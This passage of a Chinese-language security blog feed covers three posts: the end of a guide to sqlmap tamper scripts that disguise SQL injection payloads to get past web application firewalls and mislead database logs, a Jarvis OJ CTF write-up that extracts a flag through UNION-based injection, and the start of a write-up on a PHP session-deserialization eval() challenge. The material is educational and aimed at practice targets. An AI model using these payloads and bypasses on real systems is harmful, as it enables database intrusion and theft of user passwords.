information_schema.tables <strong>to</strong> select table_name from information_schema/**/.tables</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="lowercase-py"><a href="#lowercase-py" class="headerlink" title="lowercase.py"></a>lowercase.py</h2><p>将 payload 里的大写转为小写</p><blockquote><p>UNION SELECT <strong>to</strong> union select</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h2><p>用注释来包围完整的查询语句，用于绕过 ModSecurity 开源 waf</p><blockquote><p>1 and 2&gt;1–+ <strong>to</strong> 1 /<em>!30874and 2&gt;1</em>/–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h2 id="modsecurityzeroversioned-py"><a href="#modsecurityzeroversioned-py" class="headerlink" title="modsecurityzeroversioned.py"></a>modsecurityzeroversioned.py</h2><p>用注释来包围完整的查询语句，用于绕过 waf ，和上面类似</p><blockquote><p>1 and 2&gt;1–+ <strong>to</strong> 1 /<em>!00000and 2&gt;1</em>/–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h2 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py"></a>multiplespaces.py</h2><p>在关键字周围添加多个空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union select 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h2><p>关键字双写，可用于关键字过滤</p><blockquote><p>union select 1,2–+ <strong>to</strong> uniounionn selecselectt 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="overlongutf8-py"><a href="#overlongutf8-py" class="headerlink" title="overlongutf8.py"></a>overlongutf8.py</h2><p>这个不是很懂，也去网上搜了下，都说是”转换给定的 payload 当中的所有字符“，类似空格大于小于这种</p><blockquote><p>select field from table where 2&gt;1 <strong>to</strong></p><p>select%C0%AAfield%C0%AAfromtable%C0%AAwhere%C0%AA2%C0%BE1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="percentage-py"><a href="#percentage-py" class="headerlink" title="percentage.py"></a>percentage.py</h2><p>用百分号来绕过关键字过滤，具体是在关键字的每个字母前面都加一个百分号</p><blockquote><p>select <em>from users <strong>to</strong> %s%e%l%e%c%t</em> %f%r%o%m %u%s%e%r%s</p></blockquote><p><strong>适用数据库：</strong>ALL, 但是需要 ASP 环境</p><h2 id="plus2concat-py"><a href="#plus2concat-py" class="headerlink" title="plus2concat.py"></a>plus2concat.py</h2><p>用 concat 函数来替代加号，用于加号被过滤的情况</p><blockquote><p>select char(13)+char(114)+char(115) from user <strong>to</strong> select concat(char(113),char(114),char(115)) from user</p></blockquote><p><strong>适用数据库：</strong>SQL Server 2012+</p><h2 id="plus2fnconcat-py"><a href="#plus2fnconcat-py" class="headerlink" title="plus2fnconcat.py"></a>plus2fnconcat.py</h2><p>用 fn concat 来替代加号，和上面类似</p><blockquote><p>select char(13)+char(114)+char(115) from user <strong>to</strong> select {fn concat({ fn concat(char(113),char(114))},char(115))} from user</p></blockquote><p><strong>适用数据库：</strong>Microsoft SQL Server 2008+</p><h2 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h2><p>将 payload 随机大小写，可用于大小写绕过的情况</p><blockquote><p>union select 1,2–+ <strong>to</strong> UniOn SElect 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h2><p>在 payload 的关键字中间随机插入 /**/ ，可用于绕过关键字过滤</p><blockquote><p>union select 1,2–+ <strong>to</strong> un/<strong>/ion sele/</strong>/ct 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h2><blockquote><p>return payload + “ and ‘0having’=’0having’” if payload else payload</p></blockquote><p>在 payload 后面加入字符串，可以自定义</p><blockquote><p>1’ and 1=1 <strong>to</strong> 1’ and 1=1 ‘0having’=’0having’</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py"></a>sp_password.py</h2><blockquote><p>retVal = “%s%ssp_password” % (payload, “– “ if not any(_ if <em>in payload else None for</em> in (‘#’, “– “)) else “”)</p></blockquote><p>在 payload 语句后添加 ssp_password ，用于迷惑数据库日志</p><blockquote><p>1’ and 1=1–+ <strong>to</strong> 1 and 1=1– sp_password</p></blockquote><p><strong>适用数据库：</strong>MSSQL</p><h2 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h2><p>用 /**/ 替代空格，用于空格的绕过</p><blockquote><p>union select 1,2–+ <strong>to</strong> union/<strong>/select/</strong>/1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h2><p>用注释符–和一个随机字符串加一个换行符替换控制符</p><p>?union select 1,2–+ <strong>to</strong> union–HSHjsJh%0Aselect–HhjHSJ%0A1,2–+</p><p><strong>适用数据库：</strong>MSSQL、 SQLite</p><h2 id="space2hash-py"><a href="#space2hash-py" class="headerlink" title="space2hash.py"></a>space2hash.py</h2><p>和上面类似，不过这儿是用#注释符</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%23HSHjsJh%0Aselect%23HhjHSJ%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h2 id="space2morecomment-py"><a href="#space2morecomment-py" class="headerlink" title="space2morecomment.py"></a>space2morecomment.py</h2><p>将空格用 /<strong>_</strong>/ 替代</p><blockquote><p>union select 1,2–+ <strong>to</strong> union/<strong>_</strong>/select/<strong>_</strong>/1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py"></a>space2morehash.py</h2><p>和 space2hash.py 类似，但是这儿多一个 # 和换行符，具体看一下对比：</p><blockquote><p>space2hash.py： union select 1,2–+ <strong>to</strong> union %23 HSHjsJh %0A select %23 HhjHSJ %0A1,2–+</p><p>space2morehash.py：union select 1,2–+ <strong>to</strong> union %23 HSHjsJh %0A select %23 HhjHSJ %0A%23 HJHJhj %0A 1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><h2 id="space2mssqlblank-py"><a href="#space2mssqlblank-py" class="headerlink" title="space2mssqlblank.py"></a>space2mssqlblank.py</h2><blockquote><p>blanks = (‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)</p></blockquote><p>用这些随机空白符替换 payload 中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%01select%021,2–+</p></blockquote><p><strong>适用数据库：</strong>SQL Server</p><h2 id="space2mssqlhash-py"><a href="#space2mssqlhash-py" class="headerlink" title="space2mssqlhash.py"></a>space2mssqlhash.py</h2><p>用 # 加一个换行符替换 payload 中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%23%0Aselect%23%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MSSQL、MySQL</p><h2 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h2><blockquote><p>blanks = (‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)</p></blockquote><p>用这些随机空白符替换payload中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%09select%0D1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h2 id="space2mysqldash-py"><a href="#space2mysqldash-py" class="headerlink" title="space2mysqldash.py"></a>space2mysqldash.py</h2><p>用 – 加一个换行符替换空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union–%0Aselect–%0A1,2–+</p></blockquote><p><strong>适用数据库：</strong>MySQL、MSSQL</p><h2 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h2><p>用 + 替换空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union+select+1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h2><blockquote><p>blanks = (“%09”, “%0A”, “%0C”, “%0D”)</p></blockquote><p>用这些随机空白符替换 payload 中的空格</p><blockquote><p>union select 1,2–+ <strong>to</strong> union%09select%0C1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="symboliclogical-py"><a href="#symboliclogical-py" class="headerlink" title="symboliclogical.py"></a>symboliclogical.py</h2><blockquote><p>retVal = re.sub(r”(?i)bANDb”, “%26%26”, re.sub(r”(?i)bORb”, “%7C%7C”, payload))</p></blockquote><p>用 &amp;&amp; 替换 and ，用 || 替换 or ，用于这些关键字被过滤的情况</p><blockquote><p>1 and 1=1 <strong>to</strong> 1 %26%26 1=1</p><p>1 or 1=1 <strong>to</strong> 1 %7c%7c 1=1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py"></a>unionalltounion.py</h2><blockquote><p>return payload.replace(“UNION ALL SELECT”, “UNION SELECT”) if payload else payload</p></blockquote><p>用 union select 替换union all select</p><blockquote><p>union all select 1,2–+ <strong>to</strong> union select 1,2–+</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h2><p>用宽字符绕过 GPC addslashes</p><blockquote><p>1‘ and 1=1 <strong>to</strong> 1%df%27 and 1=1–</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="uppercase-py"><a href="#uppercase-py" class="headerlink" title="uppercase.py"></a>uppercase.py</h2><p>将 payload 大写</p><blockquote><p>union select <strong>to</strong> UNION SELECT</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="varnish-py"><a href="#varnish-py" class="headerlink" title="varnish.py"></a>varnish.py</h2><blockquote><p>headers = kwargs.get(“headers”, {})headers[“X-originating-IP”] = “127.0.0.1”return payload</p></blockquote><p>添加一个 HTTP 头 “ X-originating-IP ” 来绕过 WAF</p><p>还可以自定义：</p><blockquote><p>X-forwarded-for: TARGET_CACHESERVER_IP (184.189.250.X)X-remote-IP: TARGET_PROXY_IP (184.189.250.X)X-originating-IP: TARGET_LOCAL_IP (127.0.0.1)x-remote-addr: TARGET_INTERNALUSER_IP (192.168.1.X)X-remote-IP: * or %00 or %0A</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h2 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h2><p>对不是函数的关键字进行注释</p><blockquote><p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#</p></blockquote><p><strong>to</strong></p><blockquote><p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/<em>!AS</em>//<em>!CHAR</em>/),CHAR(32)),CHAR(58,100,114,117,58))#</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h2 id="versionedmorekeywords-py"><a href="#versionedmorekeywords-py" class="headerlink" title="versionedmorekeywords.py"></a>versionedmorekeywords.py</h2><p>注释每个关键字</p><blockquote><p>1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#</p></blockquote><p><strong>to</strong></p><blockquote><p>1/<em>!UNION</em>//<em>!ALL</em>//<em>!SELECT</em>//<em>!NULL</em>/,/<em>!NULL</em>/,/<em>!CONCAT</em>/(/<em>!CHAR</em>/(58,122,114,115,58),/<em>!IFNULL</em>/(CAST(/<em>!CURREN**T_USER</em>/()/<em>!AS</em>//<em>!CHAR</em>/),/<em>!CHAR</em>/(32)),/<em>!CHAR</em>/(58,115,114,121,58))#</p></blockquote><p><strong>适用数据库：</strong>MySQL &gt;= 5.1.13</p><h2 id="xforwardedfor-py"><a href="#xforwardedfor-py" class="headerlink" title="xforwardedfor.py"></a>xforwardedfor.py</h2><blockquote><p>headers = kwargs.get(“headers”, {})headers[“X-Forwarded-For”] = randomIP()return payload</p></blockquote><p>添加一个伪造的 HTTP 头 “ X-Forwarded-For ” 来绕过 WAF</p><p><strong>适用数据库：</strong>ALL</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;apostrophemask-py&quot;&gt;&lt;a href=&quot;#apostrophemask-py&quot; class=&quot;headerlink&quot; title=&quot;apostrophemask.py&quot;&gt;&lt;/a&gt;apostrophemask.py&lt;/h2&gt;&lt;blockquote&gt;

      
    
    </summary>
    
    
      <category term="SQLi" scheme="https://wywwzjj.top/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ inject</title>
    <link href="https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/"/>
    <id>https://wywwzjj.top/2019/02/26/Jarvis-OJ-inject/</id>
    <published>2019-02-26T09:56:10.000Z</published>
    <updated>2019-04-02T15:39:57.491Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://web.jarvisoj.com:32794/index.php" target="_blank" rel="noopener">http://web.jarvisoj.com:32794/index.php</a>~</p><h3 id="得到源码"><a href="#得到源码" class="headerlink" title="得到源码"></a>得到源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">require</span>(<span class="string">"config.php"</span>);</span><br><span class="line">    $table = $_GET[<span class="string">'table'</span>]?$_GET[<span class="string">'table'</span>]:<span class="string">"test"</span>;</span><br><span class="line">    $table = Filter($table);</span><br><span class="line">    mysqli_query($mysqli,<span class="string">"desc `secret_&#123;$table&#125;`"</span>) <span class="keyword">or</span> Hacker();</span><br><span class="line">    $sql = <span class="string">"select 'flag&#123;xxx&#125;' from secret_&#123;$table&#125;"</span>;</span><br><span class="line">    $ret = sql_query($sql);</span><br><span class="line">    <span class="keyword">echo</span> $ret[<span class="number">0</span>];</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>?table=flag 正常响应<br>==&gt; <strong>存在 secret_flag 表</strong><br>注意到这个反引号 ``，其作用是区分 MySQL 保留字与普通字符</p><p>本地尝试<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">desc</span>  <span class="comment"># 报错</span></span><br><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> <span class="string">`desc`</span>  <span class="comment"># 能成功执行</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">desc</span> <span class="string">`abc`</span> <span class="string">`def`</span></span><br><span class="line"><span class="keyword">desc</span> abc <span class="keyword">def</span> </span><br><span class="line"><span class="comment"># 效果是一样的</span></span><br></pre></td></tr></table></figure></p><p>结合题目 ==&gt; desc `secret_flag` `<br>（注意空格，此处如果是 desc `secret_flag`` 将被认为是执行 desc secret_flag`）</p><p>顺手执行<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span></span><br></pre></td></tr></table></figure></p><p>发现还是没有变化，依旧显示 flag{xxx}<br>不要灰心，这只显示了一条数据而已，加入 limit 试试<br><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span><span class="symbol">%20</span>limit<span class="symbol">%201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure></p><p>==&gt; 1</p><h3 id="查询字段"><a href="#查询字段" class="headerlink" title="查询字段"></a>查询字段</h3><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?table=flag`%<span class="number">20</span>`%<span class="number">20</span>union%<span class="number">20</span>select%<span class="number">20</span>group_concat(column_name)%<span class="number">20</span>from%<span class="number">20</span>information_schema.columns%<span class="number">20</span></span><br><span class="line">where%<span class="number">20</span>table_name=<span class="number">0x7365637265745f666c6167</span>%<span class="number">20</span>limit%<span class="number">201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p> ==&gt; flagUwillNeverKnow<br>(如果 <code>“</code> 被过滤，此处 table_name 的值要进行 hex 编码）</p><h3 id="查询数据"><a href="#查询数据" class="headerlink" title="查询数据"></a>查询数据</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">table=flag`<span class="symbol">%20</span>`<span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%20</span>flagUwillNeverKnow<span class="symbol">%20</span>from<span class="symbol">%20</span>secret_flag<span class="symbol">%20</span>limit<span class="symbol">%201</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><blockquote><p>PS：也可以不用 limit，直接 where 0，使得前面的查询为空，则直接显示我们的数据<br>table=flag<code>%20</code>%20where%200%20union%20select%20flagUwillNeverKnow%20from%20secret_flag</p></blockquote><h3 id="补充知识"><a href="#补充知识" class="headerlink" title="补充知识"></a>补充知识</h3><p><strong>information_schema</strong> 存储数据库信息的数据库</p><blockquote><p><strong>数据库名</strong></p><p>schemata =&gt; schema_name</p><p>tables =&gt; table_schema</p><p>columns =&gt; table_schema</p><p><strong>表名</strong></p><p>tables =&gt; table_name</p><p>columns =&gt; table_name</p><p><strong>列名</strong></p><p>columns =&gt; columns_name</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取当前数据库中所有表</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获得所有列名（字段）</span></span><br><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">"flag"</span>; </span><br><span class="line"></span><br><span class="line"><span class="comment">-- 下载数据</span></span><br><span class="line">-1′ or 1=1 union <span class="keyword">select</span> <span class="keyword">group_concat</span>(user_id,first_name,last_name),<span class="keyword">group_concat</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取表中的字段名</span></span><br><span class="line"><span class="number">-1</span>′ <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="comment">#</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;http://web.jarvisoj.com:32794/index.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://web.jarvisoj.com:32794/index.php&lt;/a&gt;~&lt;/p&gt;
&lt;h3 id=
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="SQLi" scheme="https://wywwzjj.top/tags/SQLi/"/>
    
  </entry>
  
  <entry>
    <title>Jarvis OJ phpinfo</title>
    <link href="https://wywwzjj.top/2019/02/25/Jarvis-OJ-phpinfo/"/>
    <id>https://wywwzjj.top/2019/02/25/Jarvis-OJ-phpinfo/</id>
    <published>2019-02-25T12:42:29.000Z</published>
    <updated>2019-03-21T00:49:52.438Z</updated>
    
    <content type="html"><![CDATA[<h1 id="从-session-角度学习反序列化"><a href="#从-session-角度学习反序列化" class="headerlink" title="从 session 角度学习反序列化"></a>从 session 角度学习反序列化</h1><p>下面是题目给出的源码  <a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">原题链接</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// A webshell is wait for you</span></span><br><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">OowoO</span> </span>&#123;</span><br><span class="line"><span class="keyword">public</span> $mdzz;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">$this</span>-&gt;mdzz = <span class="string">'phpinfo();'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">$m = <span class="keyword">new</span> OowoO();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">highlight_string(file_get_contents(<span class="string">'index.php'</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>题目直接给出了 <code>phpinfo</code> 信息，作为 CTF 的题来说，一定有其特别的意义。</p><p>另外，在实战中也是重要的信息泄露，不熟悉的同学可参考 <a href="https://zeroyu.xyz/2018/11/13/what-phpinfo-can-tell-we/" target="_blank" rel="noopener">phpinfo 可以告诉我们什么</a>。</p><p>遇到这种情况，可直接拿下来与默认的 <code>phpinfo</code> 进行文件对比，或许可以迅速找到突破口。</p><h3 id="困境"><a href="#困境" class="headerlink" title="困境"></a>困境</h3><p>看到 <code>__construct()</code> 和 <code>__destruct()</code> 两个魔术方法，极有可能是反序列化的题。其中，<code>__destruct()</code> 中有</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;mdzz);</span><br></pre></td></tr></table></figure><p>如果 <code>$this-&gt;mdzz</code> 可控的话，这就是一个明显的 <code>webshell</code> 了，可惜 <code>mdzz</code> 在构造函数中就限死了，而且这里并没有变量覆盖的漏洞，否则也可以打一波，陷入困境。</p><p>有这么方便的 <code>eval()</code> 在这里，能不能绕过构造函数，直接执行我们需要的命令呢？</p><p>此处必有蹊跷。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ini_set(<span class="string">'session.serialize_handler'</span>, <span class="string">'php'</span>);</span><br></pre></td></tr></table></figure><h3 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h3><p><strong>1.<a href="https://github.com/80vul/phpcodz/blob/master/research/pch-013.md" target="_blank" rel="noopener">PHP Session 序列化及反序列化处理器设置使用不当带来的安全隐患</a></strong></p><p><img src="https://i.loli.net/2019/03/21/5c92dcc97822b.png" alt="20190225080731966.png"></p><p><code>phpinfo</code> 中可以看到，PHP 反序列化时可以使用的几种方法。</p><p>平时实验过程中，也可以用这个语句进行方法指定。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">session_start([</span><br><span class="line">    <span class="string">'serialize_handler'</span> =&gt; <span class="string">'php_serialize'</span></span><br><span class="line">])</span><br></pre></td></tr></table></figure><p>在设置 session 和读取 session 两个阶段中，若使用了不同的序列化方法，将产生任意对象注入，进而导致反序列化漏洞。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[<span class="string">'test'</span>] = <span class="string">'|O:8:"stdClass":0:&#123;&#125;'</span>;</span><br><span class="line"></span><br><span class="line">存储时使用 php_serialize --&gt; </span><br><span class="line">a:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"test"</span>;s:<span class="number">20</span>:<span class="string">"|O:8:"</span>stdClass<span class="string">":0:&#123;&#125;"</span>;&#125;</span><br><span class="line"></span><br><span class="line">反序列化使用 php --&gt; </span><br><span class="line"><span class="comment">// var_dump($_SESSION);</span></span><br><span class="line"><span class="keyword">array</span>(<span class="number">1</span>) &#123;</span><br><span class="line">[<span class="string">"a:1:&#123;s:4:"</span>test<span class="string">";s:20:"</span><span class="string">"]=&gt;</span></span><br><span class="line"><span class="string">object(stdClass)#1 (0) &#123;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br></pre></td></tr></table></figure><blockquote><p>PHP 获取到 session 字符串后，就开始查找第一个 |（竖线），用竖线将字符串分割成“键名”和“键值”， 并对“键值”进行反序列化。但如果这次反序列化失败，就放弃这次解析，再去找下一个竖线，执行同样的操作，直到成功。</p></blockquote><p>然而到这里还是没解决 <code>mdzz</code> 不可控的问题，接下来引入第二个知识点。</p><p><strong>2.上传进度支持（Upload progress in sessions）</strong></p><p>正常用法参见 <a href="http://php.net/manual/zh/session.upload-progress.php" target="_blank" rel="noopener">example #1</a>，配合 Ajax 就能显示上传进度。</p><p>利用此法可达到对 <code>session</code> 写入数据的效果，从而使得 <code>$mdzz</code> 可控，可参照 <a href="http://www.91ri.org/15925.html" target="_blank" rel="noopener">有趣的 php 反序列化总结</a></p><blockquote><p>当一个上传在处理中，同时 post 一个与 ini 设置的 session.upload_progress.name 同名变量时，php 检测到这种 post 请求时就会在 $_SESSION 中添加一组数据，所以可通过 session.upload_progress 来设置 <code>session</code>。</p></blockquote><p>下面是部分参数说明</p><blockquote><p>session.upload_progress.enabled[=1] : 是否启用上传进度报告(默认开启)<br>session.upload_progress.cleanup[=1] : 是否在上传完成后及时删除进度数据(默认开启, 推荐开启).<br>session.upload_progress.prefix[=upload_progress_] : 进度数据将存储在<br>_SESSION[session.upload_progress.prefix . _POST[session.upload_progress.name]]<br>session.upload_progress.name[=PHP_SESSION_UPLOAD_PROGRESS] :<br>如果 _POST[session.upload_progress.name]没有被设置, 则不会报告进度.<br>session.upload_progress.freq[=1%] : 更新进度的频率(已经处理的字节数), 也支持百分比表示’%’.<br>session.upload_progress.min_freq[=1.0] : 更新进度的时间间隔(秒级)</p></blockquote><p>回到本题，查看 <code>phpinfo</code>， <code>session.upload_progress.enabled</code> 打开，并且 <code>session.upload_progress.cleanup</code>关闭。</p><h3 id="开干"><a href="#开干" class="headerlink" title="开干"></a>开干</h3><p><strong>构造一个表单</strong></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"http://web.jarvisoj.com:32784/index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span> <span class="attr">enctype</span>=<span 